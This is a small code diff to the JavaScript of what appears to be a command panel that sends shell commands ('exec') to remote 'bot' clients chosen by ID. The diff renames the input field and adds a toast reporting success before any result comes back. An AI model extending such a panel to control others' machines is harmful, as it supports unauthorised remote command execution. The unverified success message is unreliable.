@@ -11659,7 +11659,7 @@ $("#clients").change(function() {
 });
 
 $('#console-button').click(function() {
-    var cmd_to_send = document.getElementById('console').value
+    var cmd_to_send = document.getElementById('terminal_input').value
     if (!cmd_to_send) return new Swal({icon: "error", text: "Command field cannot be empty.", timer: 2000, timerProgressBar: true, toast: true, position: 'top-right', showCancelButton: false, showConfirmButton: false})
     var botid = parseInt(document.getElementById("clients").value.replace("b", ""));
 
@@ -11705,12 +11705,13 @@ $(function() {
     status.info('Updated console');
 	setInterval(updateConsole, 3000);
 	
-	$('#console').on('keypress', function(e) {
+	$('#terminal_input').on('keypress', function(e) {
 		if (e.keyCode == '13') {
-		var cmd_to_send = document.getElementById('console').value
+		var cmd_to_send = document.getElementById('terminal_input').value
     		if (!cmd_to_send) return new Swal({icon: "error", text: "Command field cannot be empty.", timer: 2000, timerProgressBar: true, toast: true, position: 'top-right', showCancelButton: false, showConfirmButton: false})
     		var botid = parseInt(document.getElementById("clients").value.replace("b", ""));
 		cmd('exec', { target: botid, cmd: cmd_to_send });
+		    new Swal({icon: "success", text: "Command executed successfully.", timer: 2000, timerProgressBar: true, toast: true, position: 'top-right', showCancelButton: false, showConfirmButton: false})
 			e.preventDefault();
 		}
 	});
